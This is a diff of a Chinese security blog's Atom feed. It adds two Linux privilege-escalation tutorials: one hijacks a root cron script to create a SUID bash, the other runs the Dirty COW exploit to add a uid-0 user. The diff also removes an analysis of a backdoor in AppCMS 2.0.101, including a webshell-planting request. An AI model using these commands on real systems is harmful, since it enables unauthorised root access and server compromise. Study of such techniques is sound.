@@ -6,7 +6,7 @@
   <link href="http://www.secice.cn/atom.xml" rel="self"/>
   
   <link href="http://www.secice.cn/"/>
-  <updated>2020-11-26T08:56:38.134Z</updated>
+  <updated>2020-11-26T12:10:19.304Z</updated>
   <id>http://www.secice.cn/</id>
   
   <author>
@@ -18,10 +18,10 @@
   
   <entry>
     <title>Linux提权之定时任务</title>
-    <link href="http://www.secice.cn/post/undefined"/>
-    <id>http://www.secice.cn/post/undefined</id>
+    <link href="http://www.secice.cn/post/75fd4604"/>
+    <id>http://www.secice.cn/post/75fd4604</id>
     <published>2020-11-26T07:40:12.000Z</published>
-    <updated>2020-11-26T08:56:38.134Z</updated>
+    <updated>2020-11-26T12:10:19.304Z</updated>
     
     <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" alt="Linux提权之定时任务"></p><p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p><pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre><p>如果未正确配置Cron，则可以利用它获得root特权。</p><ol><li>cron作业中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol><p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p><pre><code class="hljs bash">mkdir cleanup<span class="hljs-built_in">cd</span> cleanup<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.phpls</code></pre><p>下图是上面命令执行的结果：</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" alt="创建文件"></p><p>下面我们写一个python程序来删除 /home/cleanup的内容。</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpvi cleanup.py</code></pre><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>import osimport systry:   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)except:    sys.exit()</code></pre><p><code>chmod 777 cleanup.py</code></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" alt="创建文件"></p><p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre><p>下面是运行效果</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" alt="创建文件"></p><p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p><p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p><p>该工具的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre><p>首先将pspy上传到目标机器：</p><p>1）chmod +x pspy64s</p><p>2）./pspy64</p><p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" alt="pspy64s"></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" alt="pspy64s"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" alt="查看权限"></p><p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p><pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" alt="修改文件"></p><p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" alt="利用成功"></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" alt="root权限"></p><p>提权成功。</p>]]></content>
     
@@ -29,6 +29,30 @@
       
       
     <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间</summary>
+      
+    
+    
+    
+    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux提权之内核漏洞</title>
+    <link href="http://www.secice.cn/post/3574493e"/>
+    <id>http://www.secice.cn/post/3574493e</id>
+    <published>2020-11-26T03:12:42.000Z</published>
+    <updated>2020-11-26T12:10:19.302Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。</p><p>Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Linux内核提权漏洞-“脏牛”来做演示。</p><p>给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester</code></pre><p>1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span>./<span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span></code></pre><p>在执行上述命令之前，首先查看Linux内核版本。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/01.png" alt="查看Linux内核版本"></p><p>查看脚本执行结果，可以使用脏牛来进行提权。</p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/02.png" alt="执行结果"></p><p>2.将漏洞利用代码上传到目标机器，接下来编译并执行。</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-pthread</span> <span class="hljs-selector-tag">dirty</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">-lcrypt</span>./<span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">password</span></code></pre><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/03.png" alt="编译"></p><p><img src="/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/04.png" alt="运行"></p><p>3.该漏洞利用代码会加入一个uid为0的用户，使用<code>su firefart</code>切换到firefart用户，获取root权限。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。&lt;/p&gt;</summary>
       
     
     
@@ -496,34 +520,6 @@
     <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
     
     <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>AppCMS 2.0.101 后门分析</title>
-    <link href="http://www.secice.cn/post/4a62cc6c"/>
-    <id>http://www.secice.cn/post/4a62cc6c</id>
-    <published>2017-12-18T03:05:05.000Z</published>
-    <updated>2020-11-23T09:04:26.163Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><blockquote><p>下载地址：<a href="http://www.appcms.cc/html/gengxin.html">http://www.appcms.cc/html/gengxin.html</a></p></blockquote><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/01.png" alt="AppCMS 2.0.101 后门分析"></p><p>官方的更新时间是 2015-8-1</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用beyond compare比较与前一个版本的区别</p><a id="more"></a><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/02.png" alt="AppCMS 2.0.101 后门分析"></p><p>可以发现，在 templates/m/ 文件夹下出现了一个 content_list.php 文件，修改时间为 2017年5月25日。</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/03.png" alt="AppCMS 2.0.101 后门分析"></p><p>经过解密，<code>9c224bc6b59179729b15e1dddcbb5c82</code>为字符串<code>kejishidai</code>的md5值。</p><p>由代码知，这里存在一个copy函数构成的后门。</p><p>在第12行，实际执行的即为:</p><pre><code class="hljs php">copy(trim(<span class="hljs-variable">$_GET</span>[url]),<span class="hljs-variable">$_GET</span>[cms]);</code></pre><p>将参数url设置为<code>php://input</code>，参数cms设置为shell的文件名，然后POST传入webshell。如下：</p><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/content_list.php?session=kejishidai&amp;url=php://input&amp;cms=temp.php</span>POST:<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/04.png" alt="AppCMS 2.0.101 后门分析"></p><p>接着访问：</p><p><code>http://127.0.0.1:2500/appcms/appcms_2.0.101/templates/m/temp.php</code></p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/05.png" alt="AppCMS 2.0.101 后门分析"></p><p>getshell。</p><h1 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h1><p>删除 templates/m/ 文件夹下的content_list.php。</p><p>转载自：<a href="https://chybeta.github.io/">https://chybeta.github.io</a>，</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;下载地址：&lt;a href=&quot;http://www.appcms.cc/html/gengxin.html&quot;&gt;http://www.appcms.cc/html/gengxin.html&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&quot;/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171218_AppCMS_2.0.101_%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/01.png&quot; alt=&quot;AppCMS 2.0.101 后门分析&quot;&gt;&lt;/p&gt;
-&lt;p&gt;官方的更新时间是 2015-8-1&lt;/p&gt;
-&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;p&gt;用beyond compare比较与前一个版本的区别&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    <category term="App CMS" scheme="http://www.secice.cn/tags/App-CMS/"/>
     
   </entry>
   
